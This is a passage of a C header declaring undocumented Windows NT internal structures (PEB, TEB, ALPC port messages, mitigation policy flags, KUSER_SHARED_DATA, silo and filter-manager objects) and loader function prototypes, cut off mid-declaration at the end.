#define RTL_USER_PROC_CURDIR_CLOSE 0x00000002
#define RTL_USER_PROC_CURDIR_INHERIT 0x00000003

typedef struct _RTL_DRIVE_LETTER_CURDIR {
    USHORT Flags;
    USHORT Length;
    ULONG TimeStamp;
    STRING DosPath;
} RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
    ULONG MaximumLength;
    ULONG Length;

    ULONG Flags;
    ULONG DebugFlags;

    HANDLE ConsoleHandle;
    ULONG ConsoleFlags;
    HANDLE StandardInput;
    HANDLE StandardOutput;
    HANDLE StandardError;

    CURDIR CurrentDirectory;
    UNICODE_STRING DllPath;
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
    PVOID Environment;

    ULONG StartingX;
    ULONG StartingY;
    ULONG CountX;
    ULONG CountY;
    ULONG CountCharsX;
    ULONG CountCharsY;
    ULONG FillAttribute;

    ULONG WindowFlags;
    ULONG ShowWindowFlags;
    UNICODE_STRING WindowTitle;
    UNICODE_STRING DesktopInfo;
    UNICODE_STRING ShellInfo;
    UNICODE_STRING RuntimeData;
    RTL_DRIVE_LETTER_CURDIR CurrentDirectories[RTL_MAX_DRIVE_LETTERS];

    ULONG EnvironmentSize;
    ULONG EnvironmentVersion;
    PVOID PackageDependencyData; //8+
    ULONG ProcessGroupId;
    // ULONG LoaderThreads;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union
    {
        BOOLEAN BitField;
        struct
        {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN IsPackagedProcess : 1;
            BOOLEAN IsAppContainer : 1;
            BOOLEAN IsProtectedProcessLight : 1;
            BOOLEAN IsLongPathAwareProcess : 1;
        };
    };
    HANDLE Mutant;

    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    PVOID SubSystemData;
    PVOID ProcessHeap;
    PRTL_CRITICAL_SECTION FastPebLock;
    PVOID AtlThunkSListPtr;
    PVOID IFEOKey;
    union
    {
        ULONG CrossProcessFlags;
        struct
        {
            ULONG ProcessInJob : 1;
            ULONG ProcessInitializing : 1;
            ULONG ProcessUsingVEH : 1;
            ULONG ProcessUsingVCH : 1;
            ULONG ProcessUsingFTH : 1;
            ULONG ProcessPreviouslyThrottled : 1;
            ULONG ProcessCurrentlyThrottled : 1;
            ULONG ProcessImagesHotPatched : 1;
            ULONG ReservedBits0 : 24;
        };
        ULONG EnvironmentUpdateCount;
    };
    union
    {
        PVOID KernelCallbackTable;
        PVOID UserSharedInfoPtr;
    };
    ULONG SystemReserved[1];
    ULONG AtlThunkSListPtr32;
    PVOID ApiSetMap;
    ULONG TlsExpansionCounter;
    PVOID TlsBitmap;
    ULONG TlsBitmapBits[2];
    PVOID ReadOnlySharedMemoryBase;
    PVOID HotpatchInformation;
    PVOID *ReadOnlyStaticServerData;
    PVOID AnsiCodePageData;
    PVOID OemCodePageData;
    PVOID UnicodeCaseTableData;

    ULONG NumberOfProcessors;
    ULONG NtGlobalFlag;

    LARGE_INTEGER CriticalSectionTimeout;
    SIZE_T HeapSegmentReserve;
    SIZE_T HeapSegmentCommit;
    SIZE_T HeapDeCommitTotalFreeThreshold;
    SIZE_T HeapDeCommitFreeBlockThreshold;

    ULONG NumberOfHeaps;
    ULONG MaximumNumberOfHeaps;
    PVOID *ProcessHeaps;

    PVOID GdiSharedHandleTable;
    PVOID ProcessStarterHelper;
    ULONG GdiDCAttributeList;

    PRTL_CRITICAL_SECTION LoaderLock;

    ULONG OSMajorVersion;
    ULONG OSMinorVersion;
    USHORT OSBuildNumber;
    USHORT OSCSDVersion;
    ULONG OSPlatformId;
    ULONG ImageSubsystem;
    ULONG ImageSubsystemMajorVersion;
    ULONG ImageSubsystemMinorVersion;
    ULONG_PTR ImageProcessAffinityMask;
    GDI_HANDLE_BUFFER GdiHandleBuffer;
    PVOID PostProcessInitRoutine;

    PVOID TlsExpansionBitmap;
    ULONG TlsExpansionBitmapBits[32];

    ULONG SessionId;

    ULARGE_INTEGER AppCompatFlags;
    ULARGE_INTEGER AppCompatFlagsUser;
    PVOID pShimData;
    PVOID AppCompatInfo;

    UNICODE_STRING CSDVersion;

    PVOID ActivationContextData;
    PVOID ProcessAssemblyStorageMap;
    PVOID SystemDefaultActivationContextData;
    PVOID SystemAssemblyStorageMap;

    SIZE_T MinimumStackCommit;

    PVOID *FlsCallback;
    LIST_ENTRY FlsListHead;
    PVOID FlsBitmap;
    ULONG FlsBitmapBits[FLS_MAXIMUM_AVAILABLE / (sizeof(ULONG) * 8)];
    ULONG FlsHighIndex;

    PVOID WerRegistrationData;
    PVOID WerShipAssertPtr;
    PVOID pContextData;
    PVOID pImageHeaderHash;
    union
    {
        ULONG TracingFlags;
        struct
        {
            ULONG HeapTracingEnabled : 1;
            ULONG CritSecTracingEnabled : 1;
            ULONG LibLoaderTracingEnabled : 1;
            ULONG SpareTracingBits : 29;
        };
    };
    ULONGLONG CsrServerReadOnlySharedMemoryBase;
} PEB, *PPEB;

typedef struct _TEB_ACTIVE_FRAME_CONTEXT {
    ULONG Flags;
    PSTR FrameName;
} TEB_ACTIVE_FRAME_CONTEXT, *PTEB_ACTIVE_FRAME_CONTEXT;

typedef struct _TEB_ACTIVE_FRAME {
    ULONG Flags;
    struct _TEB_ACTIVE_FRAME *Previous;
    PTEB_ACTIVE_FRAME_CONTEXT Context;
} TEB_ACTIVE_FRAME, *PTEB_ACTIVE_FRAME;

#define GDI_BATCH_BUFFER_SIZE 310

typedef struct _GDI_TEB_BATCH {
    ULONG	Offset;
    UCHAR	Alignment[4];
    ULONG_PTR HDC;
    ULONG	Buffer[GDI_BATCH_BUFFER_SIZE];
} GDI_TEB_BATCH, *PGDI_TEB_BATCH;

typedef struct _TEB {
    NT_TIB NtTib;

    PVOID EnvironmentPointer;
    CLIENT_ID ClientId;
    PVOID ActiveRpcHandle;
    PVOID ThreadLocalStoragePointer;
    PPEB ProcessEnvironmentBlock;

    ULONG LastErrorValue;
    ULONG CountOfOwnedCriticalSections;
    PVOID CsrClientThread;
    PVOID Win32ThreadInfo;
    ULONG User32Reserved[26];
    ULONG UserReserved[5];
    PVOID WOW32Reserved;
    LCID CurrentLocale;
    ULONG FpSoftwareStatusRegister;
    PVOID SystemReserved1[54];
    NTSTATUS ExceptionCode;
    PVOID ActivationContextStackPointer;
#if defined(_M_X64)
    UCHAR SpareBytes[24];
#else
    UCHAR SpareBytes[36];
#endif
    ULONG TxFsContext;

    GDI_TEB_BATCH GdiTebBatch;
    CLIENT_ID RealClientId;
    HANDLE GdiCachedProcessHandle;
    ULONG GdiClientPID;
    ULONG GdiClientTID;
    PVOID GdiThreadLocalInfo;
    ULONG_PTR Win32ClientInfo[62];
    PVOID glDispatchTable[233];
    ULONG_PTR glReserved1[29];
    PVOID glReserved2;
    PVOID glSectionInfo;
    PVOID glSection;
    PVOID glTable;
    PVOID glCurrentRC;
    PVOID glContext;

    NTSTATUS LastStatusValue;
    UNICODE_STRING StaticUnicodeString;
    WCHAR StaticUnicodeBuffer[261];

    PVOID DeallocationStack;
    PVOID TlsSlots[64];
    LIST_ENTRY TlsLinks;

    PVOID Vdm;
    PVOID ReservedForNtRpc;
    PVOID DbgSsReserved[2];

    ULONG HardErrorMode;
#if defined(_M_X64)
    PVOID Instrumentation[11];
#else
    PVOID Instrumentation[9];
#endif
    GUID ActivityId;

    PVOID SubProcessTag;
    PVOID EtwLocalData;
    PVOID EtwTraceData;
    PVOID WinSockData;
    ULONG GdiBatchCount;

    union
    {
        PROCESSOR_NUMBER CurrentIdealProcessor;
        ULONG IdealProcessorValue;
        struct
        {
            UCHAR ReservedPad0;
            UCHAR ReservedPad1;
            UCHAR ReservedPad2;
            UCHAR IdealProcessor;
        };
    };

    ULONG GuaranteedStackBytes;
    PVOID ReservedForPerf;
    PVOID ReservedForOle;
    ULONG WaitingOnLoaderLock;
    PVOID SavedPriorityState;
    ULONG_PTR SoftPatchPtr1;
    PVOID ThreadPoolData;
    PVOID *TlsExpansionSlots;
#if defined(_M_X64)
    PVOID DeallocationBStore;
    PVOID BStoreLimit;
#endif
    ULONG MuiGeneration;
    ULONG IsImpersonating;
    PVOID NlsCache;
    PVOID pShimData;
    ULONG HeapVirtualAffinity;
    HANDLE CurrentTransactionHandle;
    PTEB_ACTIVE_FRAME ActiveFrame;
    PVOID FlsData;

    PVOID PreferredLanguages;
    PVOID UserPrefLanguages;
    PVOID MergedPrefLanguages;
    ULONG MuiImpersonation;

    union
    {
        USHORT CrossTebFlags;
        USHORT SpareCrossTebBits : 16;
    };
    union
    {
        USHORT SameTebFlags;
        struct
        {
            USHORT SafeThunkCall : 1;
            USHORT InDebugPrint : 1;
            USHORT HasFiberData : 1;
            USHORT SkipThreadAttach : 1;
            USHORT WerInShipAssertCode : 1;
            USHORT RanProcessInit : 1;
            USHORT ClonedThread : 1;
            USHORT SuppressDebugMsg : 1;
            USHORT DisableUserStackWalk : 1;
            USHORT RtlExceptionAttached : 1;
            USHORT InitialThread : 1;
            USHORT SpareSameTebBits : 1;
        };
    };

    PVOID TxnScopeEnterCallback;
    PVOID TxnScopeExitCallback;
    PVOID TxnScopeContext;
    ULONG LockCount;
    ULONG SpareUlong0;
    PVOID ResourceRetValue;
} TEB, *PTEB;

typedef struct _PROCESS_DEVICEMAP_INFORMATION {
    union {
        struct {
            HANDLE DirectoryHandle;
        } Set;
        struct {
            ULONG DriveMap;
            UCHAR DriveType[32];
        } Query;
    };
} PROCESS_DEVICEMAP_INFORMATION, *PPROCESS_DEVICEMAP_INFORMATION;

__inline struct _PEB * NtCurrentPeb() { return NtCurrentTeb()->ProcessEnvironmentBlock; }

/*
** PEB/TEB END
*/

/*
** ALPC START
*/

typedef struct _PORT_MESSAGE {
    union {
        struct {
            CSHORT DataLength;
            CSHORT TotalLength;
        } s1;
        ULONG Length;
    } u1;
    union {
        struct {
            CSHORT Type;
            CSHORT DataInfoOffset;
        } s2;
        ULONG ZeroInit;
    } u2;
    union {
        CLIENT_ID ClientId;
        double DoNotUseThisField;       // Force quadword alignment
    } u3;
    ULONG MessageId;
    union {
        ULONG ClientViewSize;               // Only valid on LPC_CONNECTION_REQUEST message
        ULONG CallbackId;                   // Only valid on LPC_REQUEST message
    } u4;
    UCHAR Reserved[8];
} PORT_MESSAGE, *PPORT_MESSAGE;

// end_ntsrv

typedef struct _PORT_DATA_ENTRY {
    PVOID Base;
    ULONG Size;
} PORT_DATA_ENTRY, *PPORT_DATA_ENTRY;

typedef struct _PORT_DATA_INFORMATION {
    ULONG CountDataEntries;
    PORT_DATA_ENTRY DataEntries[1];
} PORT_DATA_INFORMATION, *PPORT_DATA_INFORMATION;

#define LPC_REQUEST             1
#define LPC_REPLY               2
#define LPC_DATAGRAM            3
#define LPC_LOST_REPLY          4
#define LPC_PORT_CLOSED         5
#define LPC_CLIENT_DIED         6
#define LPC_EXCEPTION           7
#define LPC_DEBUG_EVENT         8
#define LPC_ERROR_EVENT         9
#define LPC_CONNECTION_REQUEST 10

#define PORT_VALID_OBJECT_ATTRIBUTES (OBJ_CASE_INSENSITIVE)
#define PORT_MAXIMUM_MESSAGE_LENGTH 256

typedef struct _LPC_CLIENT_DIED_MSG {
    PORT_MESSAGE PortMsg;
    LARGE_INTEGER CreateTime;
} LPC_CLIENT_DIED_MSG, *PLPC_CLIENT_DIED_MSG;

//#pragma pack(push, 1)
typedef struct _PORT_VIEW {
    ULONG Length;
    HANDLE SectionHandle;
    ULONG SectionOffset;
    SIZE_T ViewSize;
    PVOID ViewBase;
    PVOID ViewRemoteBase;
} PORT_VIEW, *PPORT_VIEW;

typedef struct _REMOTE_PORT_VIEW {
    ULONG Length;
    SIZE_T ViewSize;
    PVOID ViewBase;
} REMOTE_PORT_VIEW, *PREMOTE_PORT_VIEW;
//#pragma pack(pop)
/*
** ALPC END
*/

/*
**  MITIGATION POLICY START
*/

//redefine enum

#define ProcessDEPPolicy                    0
#define ProcessASLRPolicy                   1
#define ProcessDynamicCodePolicy            2
#define ProcessStrictHandleCheckPolicy      3
#define ProcessSystemCallDisablePolicy      4
#define ProcessMitigationOptionsMask        5
#define ProcessExtensionPointDisablePolicy  6
#define ProcessControlFlowGuardPolicy       7
#define ProcessSignaturePolicy              8
#define ProcessFontDisablePolicy            9
#define ProcessImageLoadPolicy              10
#define ProcessSystemCallFilterPolicy       11
#define ProcessPayloadRestrictionPolicy     12
#define ProcessChildProcessPolicy           13
#define ProcessSideChannelIsolationPolicy   14

typedef struct tagPROCESS_MITIGATION_BINARY_SIGNATURE_POLICY_W10 {
    union {
        DWORD Flags;
        struct {
            DWORD MicrosoftSignedOnly : 1;
            DWORD StoreSignedOnly : 1;
            DWORD MitigationOptIn : 1;
            DWORD AuditMicrosoftSignedOnly : 1;
            DWORD AuditStoreSignedOnly : 1;
            DWORD ReservedFlags : 27;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
} PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY_W10, *PPROCESS_MITIGATION_BINARY_SIGNATURE_POLICY_W10;

typedef struct tagPROCESS_MITIGATION_DYNAMIC_CODE_POLICY_W10 {
    union {
        DWORD Flags;
        struct {
            DWORD ProhibitDynamicCode : 1;
            DWORD AllowThreadOptOut : 1;
            DWORD AllowRemoteDowngrade : 1;
            DWORD AuditProhibitDynamicCode : 1;
            DWORD ReservedFlags : 28;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
} PROCESS_MITIGATION_DYNAMIC_CODE_POLICY_W10, *PPROCESS_MITIGATION_DYNAMIC_CODE_POLICY_W10;

typedef struct tagPROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY_W10 {
    union {
        DWORD Flags;
        struct {
            DWORD EnableControlFlowGuard : 1;
            DWORD EnableExportSuppression : 1;
            DWORD StrictMode : 1;
            DWORD ReservedFlags : 29;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
} PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY_W10, *PPROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY_W10;

typedef struct tagPROCESS_MITIGATION_FONT_DISABLE_POLICY_W10 {
    union {
        DWORD Flags;
        struct {
            DWORD DisableNonSystemFonts : 1;
            DWORD AuditNonSystemFontLoading : 1;
            DWORD ReservedFlags : 30;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
} PROCESS_MITIGATION_FONT_DISABLE_POLICY_W10, *PPROCESS_MITIGATION_FONT_DISABLE_POLICY_W10;

typedef struct tagPROCESS_MITIGATION_IMAGE_LOAD_POLICY_W10 {
    union {
        DWORD Flags;
        struct {
            DWORD NoRemoteImages : 1;
            DWORD NoLowMandatoryLabelImages : 1;
            DWORD PreferSystem32Images : 1;
            DWORD AuditNoRemoteImages : 1;
            DWORD AuditNoLowMandatoryLabelImages : 1;
            DWORD ReservedFlags : 27;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
} PROCESS_MITIGATION_IMAGE_LOAD_POLICY_W10, *PPROCESS_MITIGATION_IMAGE_LOAD_POLICY_W10;

typedef struct tagPROCESS_MITIGATION_SYSTEM_CALL_FILTER_POLICY_W10 {
    union {
        ULONG Flags;
        struct {
            ULONG FilterId : 4;
            ULONG ReservedFlags : 28;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
} PROCESS_MITIGATION_SYSTEM_CALL_FILTER_POLICY_W10, *PPROCESS_MITIGATION_SYSTEM_CALL_FILTER_POLICY_W10;

typedef struct tagPROCESS_MITIGATION_PAYLOAD_RESTRICTION_POLICY_W10 {
    union {
        ULONG Flags;
        struct {
            ULONG EnableExportAddressFilter : 1;
            ULONG AuditExportAddressFilter : 1;
            ULONG EnableExportAddressFilterPlus : 1;
            ULONG AuditExportAddressFilterPlus : 1;
            ULONG EnableImportAddressFilter : 1;
            ULONG AuditImportAddressFilter : 1;
            ULONG EnableRopStackPivot : 1;
            ULONG AuditRopStackPivot : 1;
            ULONG EnableRopCallerCheck : 1;
            ULONG AuditRopCallerCheck : 1;
            ULONG EnableRopSimExec : 1;
            ULONG AuditRopSimExec : 1;
            ULONG ReservedFlags : 20;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
} PROCESS_MITIGATION_PAYLOAD_RESTRICTION_POLICY_W10, *PPROCESS_MITIGATION_PAYLOAD_RESTRICTION_POLICY_W10;

typedef struct tagPROCESS_MITIGATION_CHILD_PROCESS_POLICY_W10 {
    union {
        ULONG Flags;
        struct {
            ULONG NoChildProcessCreation : 1;
            ULONG AuditNoChildProcessCreation : 1;
            ULONG AllowSecureProcessCreation : 1;
            ULONG ReservedFlags : 29;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
} PROCESS_MITIGATION_CHILD_PROCESS_POLICY_W10, *PPROCESS_MITIGATION_CHILD_PROCESS_POLICY_W10;

typedef struct _PROCESS_MITIGATION_POLICY_INFORMATION {
    PROCESS_MITIGATION_POLICY Policy;
    union
    {
        PROCESS_MITIGATION_ASLR_POLICY ASLRPolicy;
        PROCESS_MITIGATION_STRICT_HANDLE_CHECK_POLICY StrictHandleCheckPolicy;
        PROCESS_MITIGATION_SYSTEM_CALL_DISABLE_POLICY SystemCallDisablePolicy;
        PROCESS_MITIGATION_EXTENSION_POINT_DISABLE_POLICY ExtensionPointDisablePolicy;
        PROCESS_MITIGATION_DYNAMIC_CODE_POLICY_W10 DynamicCodePolicy;
        PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY_W10 ControlFlowGuardPolicy;
        PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY_W10 SignaturePolicy;
        PROCESS_MITIGATION_FONT_DISABLE_POLICY_W10 FontDisablePolicy;
        PROCESS_MITIGATION_IMAGE_LOAD_POLICY_W10 ImageLoadPolicy;
        PROCESS_MITIGATION_SYSTEM_CALL_FILTER_POLICY_W10 SystemCallFilterPolicy;
        PROCESS_MITIGATION_PAYLOAD_RESTRICTION_POLICY_W10 PayloadRestrictionPolicy;
        PROCESS_MITIGATION_CHILD_PROCESS_POLICY_W10 ChildProcessPolicy;
    };
} PROCESS_MITIGATION_POLICY_INFORMATION, *PPROCESS_MITIGATION_POLICY_INFORMATION;

/*
**  MITIGATION POLICY END
*/

/*
** KUSER_SHARED_DATA START
*/
#define NX_SUPPORT_POLICY_ALWAYSOFF 0
#define NX_SUPPORT_POLICY_ALWAYSON  1
#define NX_SUPPORT_POLICY_OPTIN     2
#define NX_SUPPORT_POLICY_OPTOUT    3

#include <pshpack4.h>
typedef struct _KSYSTEM_TIME {
    ULONG LowPart;
    LONG High1Time;
    LONG High2Time;
} KSYSTEM_TIME, *PKSYSTEM_TIME;
#include <poppack.h>

typedef enum _NT_PRODUCT_TYPE {
    NtProductWinNt = 1,
    NtProductLanManNt,
    NtProductServer
} NT_PRODUCT_TYPE, *PNT_PRODUCT_TYPE;

#define PROCESSOR_FEATURE_MAX 64

typedef enum _ALTERNATIVE_ARCHITECTURE_TYPE {
    StandardDesign,                 // None == 0 == standard design
    NEC98x86,                       // NEC PC98xx series on X86
    EndAlternatives                 // past end of known alternatives
} ALTERNATIVE_ARCHITECTURE_TYPE;

//
// Define Address of User Shared Data
//
#define MM_SHARED_USER_DATA_VA      0x000000007FFE0000

//
// WARNING: this definition is OS version dependent.
// Structure maybe incomplete.
//
#include <pshpack4.h>
typedef struct _KUSER_SHARED_DATA {

    ULONG TickCountLowDeprecated;
    ULONG TickCountMultiplier;

    volatile KSYSTEM_TIME InterruptTime;
    volatile KSYSTEM_TIME SystemTime;
    volatile KSYSTEM_TIME TimeZoneBias;

    USHORT ImageNumberLow;
    USHORT ImageNumberHigh;

    WCHAR NtSystemRoot[260];

    ULONG MaxStackTraceDepth;
    ULONG CryptoExponent;
    ULONG TimeZoneId;
    ULONG LargePageMinimum;

    union {
        ULONG Reserved2[7];
        struct {
            ULONG AitSamplingValue;
            ULONG AppCompatFlag;
            struct {
                ULONG LowPart;
                ULONG HighPart;
            } RNGSeedVersion;
            ULONG GlobalValidationRunlevel;
            LONG TimeZoneBiasStamp;
            ULONG NtBuildNumber;
        };
    };

    NT_PRODUCT_TYPE NtProductType;
    BOOLEAN ProductTypeIsValid;
    UCHAR Reserved0[1];
    USHORT NativeProcessorArchitecture;

    ULONG NtMajorVersion;
    ULONG NtMinorVersion;

    BOOLEAN ProcessorFeatures[PROCESSOR_FEATURE_MAX];
    ULONG Reserved1;
    ULONG Reserved3;
    volatile ULONG TimeSlip;
    ALTERNATIVE_ARCHITECTURE_TYPE AlternativeArchitecture;
    ULONG AltArchitecturePad;
    LARGE_INTEGER SystemExpirationDate;
    ULONG SuiteMask;
    BOOLEAN KdDebuggerEnabled;

    union {
        UCHAR MitigationPolicies;
        struct {
            UCHAR NXSupportPolicy : 2;
            UCHAR SEHValidationPolicy : 2;
            UCHAR CurDirDevicesSkippedForDlls : 2;
            UCHAR Reserved : 2;
        };
    };

    UCHAR Reserved6[2];

    volatile ULONG ActiveConsoleId;
    volatile ULONG DismountCount;
    ULONG ComPlusPackage;
    ULONG LastSystemRITEventTickCount;
    ULONG NumberOfPhysicalPages;
    BOOLEAN SafeBootMode;
    UCHAR VirtualizationFlags;
    UCHAR Reserved12[2];

    union {
        ULONG SharedDataFlags;
        struct {
            ULONG DbgErrorPortPresent : 1;
            ULONG DbgElevationEnabled : 1;
            ULONG DbgVirtEnabled : 1;
            ULONG DbgInstallerDetectEnabled : 1;
            ULONG DbgLkgEnabled : 1;
            ULONG DbgDynProcessorEnabled : 1;
            ULONG DbgConsoleBrokerEnabled : 1;
            ULONG DbgSecureBootEnabled : 1;
            ULONG DbgMultiSessionSku : 1;
            ULONG DbgMultiUsersInSessionSku : 1;
            ULONG DbgStateSeparationEnabled : 1;
            ULONG SpareBits : 21;
        };
    };
    ULONG DataFlagsPad[1];
    ULONGLONG TestRetInstruction;
    LONGLONG QpcFrequency;

    ULONG SystemCall;
    ULONG SystemCallPad0;

    ULONGLONG SystemCallPad[2];

    union {
        volatile KSYSTEM_TIME TickCount;
        volatile ULONG64 TickCountQuad;
        ULONG ReservedTickCountOverlay[3];
    };

    ULONG TickCountPad[1];

    ULONG Cookie;
    ULONG CookiedPad;

    ULONG ConsoleSessionForegroundProcessId;

    ULONGLONG TimeUpdateLock;
    ULONGLONG BaselineSystemTimeQpc;
    ULONGLONG BaselineInterruptTimeQpc;
    ULONGLONG QpcSystemTimeIncrement;
    ULONGLONG QpcInterruptTimeIncrement;
    UCHAR QpcSystemTimeIncrementShift;
    UCHAR QpcInterruptTimeIncrementShift;
    USHORT UnparkedProcessorCount;

    ULONG EnclaveFeatureMask[4];
    union {
        ULONG Reserved8;
        ULONG TelemetryCoverageRound;
    };

    USHORT UserModeGlobalLogger[16];

    ULONG ImageFileExecutionOptions;
    ULONG LangGenerationCount;
    ULONGLONG Reserved4;

    volatile ULONG64 InterruptTimeBias;
    volatile ULONG64 QpcBias;

    ULONG ActiveProcessorCount;
    volatile UCHAR ActiveGroupCount;
    UCHAR Reserved9;

    union {
        USHORT QpcData;
        struct {
            UCHAR QpcBypassEnabled : 1;
            UCHAR QpcShift : 1;
        };
    };

    LARGE_INTEGER TimeZoneBiasEffectiveStart;
    LARGE_INTEGER TimeZoneBiasEffectiveEnd;

    XSTATE_CONFIGURATION XState;

} KUSER_SHARED_DATA, *PKUSER_SHARED_DATA;
#include <poppack.h>

#define USER_SHARED_DATA ((KUSER_SHARED_DATA * const)MM_SHARED_USER_DATA_VA)

/*
** KUSER_SHARED_DATA END
*/

/*
** FLT MANAGER START
*/

#define FLTFL_MANDATORY_UNLOAD_IN_PROGRESS  0x1
#define FLTFL_FILTERING_INITIATED           0x2
#define FLTFL_NAME_PROVIDER                 0x4
#define FLTFL_SUPPORTS_PIPES_MAILSLOTS      0x8

#define FLT_OBFL_DRAINING                   0x1
#define FLT_OBFL_ZOMBIED                    0x2
#define FLT_OBFL_TYPE_INSTANCE              0x1000000
#define FLT_OBFL_TYPE_FILTER                0x2000000
#define FLT_OBFL_TYPE_VOLUME                0x4000000

typedef struct _FLT_OBJECT {
    ULONG Flags;
    ULONG PointerCount;
    EX_RUNDOWN_REF RundownRef;
    LIST_ENTRY PrimaryLink;
} FLT_OBJECT, *PFLT_OBJECT;

typedef struct _FLT_SERVER_PORT_OBJECT {
    LIST_ENTRY FilterLink;
    PVOID ConnectNotify;
    PVOID DisconnectNotify;
    PVOID MessageNotify;
    PVOID Filter;
    PVOID Cookie;
    ULONG Flags;
    ULONG NumberOfConnections;
    ULONG MaxConnections;
} FLT_SERVER_PORT_OBJECT, *PFLT_SERVER_PORT_OBJECT;

/*
** FLT MANAGER END
*/

/*
** SILO START
*/

typedef struct _SYSTEM_ROOT_SILO_INFORMATION {
    ULONG NumberOfSilos;
    ULONG SiloIdList[1];
} SYSTEM_ROOT_SILO_INFORMATION, *PSYSTEM_ROOT_SILO_INFORMATION;

typedef struct _SILO_USER_SHARED_DATA {
    ULONG64 ServiceSessionId;
    ULONG ActiveConsoleId;
    LONGLONG ConsoleSessionForegroundProcessId;
    NT_PRODUCT_TYPE NtProductType;
    ULONG SuiteMask;
    ULONG SharedUserSessionId;
    BOOLEAN IsMultiSessionSku;
    WCHAR NtSystemRoot[260];
    USHORT UserModeGlobalLogger[16];
} SILO_USER_SHARED_DATA, *PSILO_USER_SHARED_DATA;

typedef struct _OBP_SYSTEM_DOS_DEVICE_STATE {
    ULONG GlobalDeviceMap;
    ULONG LocalDeviceCount[26];
} OBP_SYSTEM_DOS_DEVICE_STATE, *POBP_SYSTEM_DOS_DEVICE_STATE;

typedef struct _OBP_SILODRIVERSTATE {
    PDEVICE_MAP SystemDeviceMap;
    OBP_SYSTEM_DOS_DEVICE_STATE SystemDosDeviceState;
    EX_PUSH_LOCK DeviceMapLock;
    OBJECT_NAMESPACE_LOOKUPTABLE PrivateNamespaceLookupTable;
} OBP_SILODRIVERSTATE, *POBP_SILODRIVERSTATE;

//incomplete, values not important, change between versions.
typedef struct _ESERVERSILO_GLOBALS {
    OBP_SILODRIVERSTATE ObSiloState;
    //incomplete
} ESERVERSILO_GLOBALS, *PESERVERSILO_GLOBALS;

/*
** SILO END
*/

/*
**  LDR START
*/

typedef VOID(NTAPI *PLDR_LOADED_MODULE_ENUMERATION_CALLBACK_FUNCTION)(
    _In_    PCLDR_DATA_TABLE_ENTRY DataTableEntry,
    _In_    PVOID Context,
    _Inout_ BOOLEAN *StopEnumeration
    );

typedef VOID(CALLBACK *PLDR_DLL_NOTIFICATION_FUNCTION)(
    _In_ ULONG NotificationReason,
    _In_ PCLDR_DLL_NOTIFICATION_DATA NotificationData,
    _In_opt_ PVOID Context);

NTSYSAPI
NTSTATUS
NTAPI
LdrAccessResource(
    _In_ PVOID DllHandle,
    _In_ CONST IMAGE_RESOURCE_DATA_ENTRY* ResourceDataEntry,
    _Out_opt_ PVOID *Address,
    _Out_opt_ PULONG Size);

NTSYSAPI
NTSTATUS
NTAPI
LdrAddRefDll(
    _In_ ULONG Flags,
    _In_ PVOID DllHandle);

NTSYSAPI
NTSTATUS
NTAPI
LdrEnumerateLoadedModules(
    _In_opt_ ULONG Flags,
    _In_ PLDR_LOADED_MODULE_ENUMERATION_CALLBACK_FUNCTION CallbackFunction,
    _In_opt_ PVOID Context);

NTSYSAPI
NTSTATUS
NTAPI
LdrFindResource_U(
    _In_ PVOID DllHandle,
    _In_ CONST ULONG_PTR* ResourceIdPath,
    _In_ ULONG ResourceIdPathLength,
    _Out_ PIMAGE_RESOURCE_DATA_ENTRY *ResourceDataEntry);

NTSYSAPI
NTSTATUS
NTAPI
LdrFindResourceDirectory_U(
    _In_ PVOID DllHandle,
    _In_ PLDR_RESOURCE_INFO ResourceInfo,
    _In_ ULONG Level,
    _Out_ PIMAGE_RESOURCE_DIRECTORY *ResourceDirectory);

NTSYSAPI
NTSTATUS
NTAPI
LdrFindEntryForAddress(
    _In_ PVOID Address,
    _Out_ PLDR_DATA_TABLE_ENTRY *TableEntry);

NTSYSAPI
NTSTATUS
NTAPI
LdrGetDllHandle(
    _In_opt_ PCWSTR DllPath,
    _In_opt_ PULONG DllCharacteristics,
    _In_ PCUNICODE_STRING DllName,
    _Out_ PVOID *DllHandle);

NTSYSAPI
NTSTATUS
NTAPI
LdrGetDllHandleEx(
    _In_ ULONG Flags,
    _In_opt_ PWSTR DllPath,
    _In_opt_ PULONG DllCharacteristics,
    _In_ PUNICODE_STRING DllName,
    _Out_opt_ PVOID *DllHandle);

NTSYSAPI
NTSTATUS
NTAPI
LdrGetDllHandleByMapping(
    _In_ PVOID BaseAddress,
    _Out_ PVOID *DllHandle);

NTSYSAPI
NTSTATUS
NTAPI
LdrGetDllHandleByName(
    _In_opt_ PUNICODE_STRING BaseDllName,
    _In_opt_ PUNICODE_STRING FullDllName,
    _Out_ PVOID *DllHandle);

NTSYSAPI
NTSTATUS
NTAPI
LdrGetDllFullName(
    _In_ PVOID DllHandle,
    _Out_ PUNICODE_STRING FullDllName);

NTSYSAPI
NTSTATUS
NTAPI
LdrGetDllDirectory(
    _Out_ PUNICODE_STRING DllDirectory);

NTSYSAPI
NTSTATUS
NTAPI
LdrSetDllDirectory(
    _In_ PUNICODE_STRING DllDirectory);

NTSYSAPI
NTSTATUS
NTAPI
